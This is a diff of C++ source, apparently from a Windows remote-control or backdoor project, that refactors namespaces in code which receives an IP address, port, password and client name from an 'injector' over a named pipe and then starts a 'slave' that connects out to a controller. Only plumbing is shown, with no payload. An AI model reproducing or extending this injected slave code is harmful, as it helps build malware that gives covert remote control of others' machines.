@@ -1,12 +1,8 @@
 #include <windows.h>
 HANDLE threadHandle;
 
-#include <Innocence.hpp>
-using namespace Innocence;
-
-#include <common/Log.hpp>
-
-
+#include <common/Innocence.hpp>
+#include <log/Log.hpp>
 #include <system/Uac.hpp>
 #include <system/Process.hpp>
 using namespace System;
@@ -18,16 +14,16 @@ using namespace System;
 // il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
 // nous envoyer l'injecteur
 // pour ce faire, on utilise les "pipe" à la windows (IPC)
-ConnectionInfo getConnectionInfo()
+Common::ConnectionInfo getConnectionInfo()
 {
-	ConnectionInfo info;
+	Common::ConnectionInfo info;
 	try
 	{
 		Network::Pipe pipe;
-		pipe.connect(Innocence::PIPE_NAME);
-		char blaspheme [CONNECTION_INFO_SIZE];
-		pipe.recv(blaspheme, CONNECTION_INFO_SIZE);
-		std::string buffer(blaspheme, CONNECTION_INFO_SIZE);
+		pipe.connect(Common::PIPE_NAME);
+		char blaspheme [Common::CONNECTION_INFO_SIZE];
+		pipe.recv(blaspheme, Common::CONNECTION_INFO_SIZE);
+		std::string buffer(blaspheme, Common::CONNECTION_INFO_SIZE);
 		size_t end = buffer.find_last_of(MARKER);
 		buffer = buffer.substr(MARKER_SIZE, end+1-2*MARKER_SIZE);
 
@@ -39,7 +35,7 @@ ConnectionInfo getConnectionInfo()
 		std::getline( iss, info.name, SEPERATOR );
 		std::getline( iss, info.password, SEPERATOR );
 
-		fromString(port_buffer, info.port);
+		Common::fromString(port_buffer, info.port);
 		pipe.disconnect();
 	}
 	catch(Network::PipeException&)
@@ -60,14 +56,14 @@ DWORD WINAPI run(void)
 {
 	try
 	{
-		LOG.setIdentity(Innocence::identity);
-		LOG.addObserver(new Common::LogToConsole);
-		LOG.addObserver(new Common::LogToCollector);
-		ConnectionInfo info = getConnectionInfo();	    
+		LOG.setIdentity(Common::identity);
+		LOG.addObserver(new Log::LogToConsole);
+		LOG.addObserver(new Log::LogToCollector);
+		Common::ConnectionInfo info = getConnectionInfo();	    
 		
 		Inhibition::SlaveCore slave(info);
 		LOG << GetElevationType();
-		LOG << "Trying connection on " + slave.getConnection().ip + ":" + toString(slave.getConnection().port);
+		LOG << "Trying connection on " + slave.getConnection().ip + ":" + Common::toString(slave.getConnection().port);
 		while(!slave.exiting())
 		{
 			try
